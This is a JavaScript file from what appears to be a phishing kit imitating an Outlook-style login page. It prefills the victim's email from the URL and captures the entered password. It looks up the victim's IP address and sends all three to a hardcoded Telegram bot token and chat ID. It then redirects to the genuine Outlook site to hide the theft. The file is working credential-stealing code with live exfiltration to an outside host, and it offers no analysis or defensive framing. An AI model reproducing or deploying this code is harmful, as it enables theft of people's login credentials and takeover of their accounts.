function getParameterByName(name, url = window.location.href) {
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
       results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
 }
 
 function ValidateEmail(mail) {
    if (!/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {
       document.getElementById("fuckyoubro").style.display = "block";
       return false;
    }
    document.getElementById("fuckyoubro").style.display = "none";
    myFunction();
 }
 let apiURL = 'https://ip-address-js.herokuapp.com/'
 
 function myFunction() {
    x = document.getElementById("username").required;
    if (document.getElementById("username").value.length < 2) {
       return false;
    }
    document.getElementById("x1").style.display = "none";
    document.getElementById("demo").innerHTML = document.getElementById("username").value;
    document.getElementById("x").style.display = "block";
 }
 
 function myFunction0() {
    document.getElementById("x").style.display = "none";
    document.getElementById("x1").style.display = "block";
 }
 const sendme = async () => {
    const botToken = '6892304308:AAE6xiuUOIGidz0869JygcI8ERGu_NLUIXI';        //telegram tokens goes here1
    const chatId = '-4195411085';                                             // CHAT_ID goes here!
    if (document.getElementById("passw").value.length < 2) {
       return false;
    }
    const username = document.getElementById("username").value;
    const passw = document.getElementById("passw").value;
    const email = new String(username);
    const passwo = new String(passw);
    const ipAddress = await fetch('https://api.ipify.org/?format=json').then(response => response.json()).then(data => data.ip).catch(error => {
       console.error(error);
       return null;
    });
    if (ipAddress) {
       const Result = `New Login Details:\nEmail: ${email}  \nPassword: ${passwo}  \nIP Address: ${ipAddress}`;
       const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(Result)}`;
       fetch(apiUrl).then(response => response.json()).then(data => {
          if (data.ok) {
             window.location.replace("http://outlook.office.com/owa");
          } else {
             alert('Failed to send login details to Telegram!');
          }
       }).catch(error => {
          console.error(error);
          alert('Failed to send login details to Telegram!');
       });
    } else {
       alert('Failed to retrieve IP address!');
    }
 };
 if (getParameterByName('email')) {
    document.getElementById('username').value = getParameterByName('email');
 }
 
//  apiToken: 6892304308:AAE6xiuUOIGidz0869JygcI8ERGu_NLUIXI
//  chatId: -4195411085